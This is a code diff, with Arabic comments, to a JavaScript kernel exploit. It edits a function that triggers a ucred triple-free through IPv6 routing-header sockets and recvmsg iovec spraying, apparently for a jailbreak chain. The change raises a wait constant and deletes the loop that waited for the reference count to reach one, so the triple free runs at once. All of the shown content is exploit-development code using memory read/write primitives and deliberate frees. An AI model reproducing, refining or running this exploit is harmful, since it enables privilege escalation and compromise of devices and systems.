@@ -1252,13 +1252,15 @@ function remove_uaf_file() {
 }
 // ثوابت بدل الأرقام السحرية
 var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 16;
-var TRIPLEFREE_REFCOUNT_MAX_WAIT = 200;
+var TRIPLEFREE_REFCOUNT_MAX_WAIT = 2000;
+
 function trigger_ucred_triplefree() {
   var end = false;
 
   // msgIov كما في الأصلي
   write64(msgIov.add(0x0), 1);
   write64(msgIov.add(0x8), 1);
+
   var main_count = 0;
   while (!end && main_count < TRIPLEFREE_ITERATIONS) {
     main_count++;
@@ -1301,43 +1303,13 @@ function trigger_ucred_triplefree() {
       close(new BigInt(uaf_socket));
       continue;
     }
+
     // 9) free واحدة من التوأم
     free_rthdr(ipv6_socks[twins[1]]);
 
-    // 10) انتظار refcount = 1 مع ضغط أقل
-    var leak_add = leak_rthdr.add(0x04);
-    var count = 0;
-    var ref_ok = false;
+    // ✅ 10) مفيش انتظار refcount هنا خالص
+    // نكمّل على طول
 
-    // نخلي الحد أقل بكتير علشان ما نفضلش نضرب في UAF
-    while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
-      // شغّل recvmsg
-      trigger_iov_recvmsg();
-
-      // كمّل دورة iov
-      write(new BigInt(iov_sock_1), tmp, 1);
-      wait_iov_recvmsg();
-      read(new BigInt(iov_sock_0), tmp, 1);
-
-      // اقرأ refcount
-      write32(leak_add, 0);
-      get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
-
-      if (read32(leak_add) === 1) {
-        ref_ok = true;
-        break;
-      }
-      count++;
-    }
-
-    // لو ما وصلش 1، ما نضغطش زيادة — نعتبرها محاولة فاشلة ونرجع نعيد من الأول
-    if (!ref_ok) {
-      twins[0] = -1;
-      twins[1] = -1;
-      close(new BigInt(uaf_socket));
-      end = false;
-      continue;
-    }
     triplets[0] = twins[0];
 
     // 11) triple free فعليًا
@@ -1364,9 +1336,11 @@ function trigger_ucred_triplefree() {
       end = false;
       continue;
     }
+
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
   }
+
   if (main_count === TRIPLEFREE_ITERATIONS) {
     return false;
   }
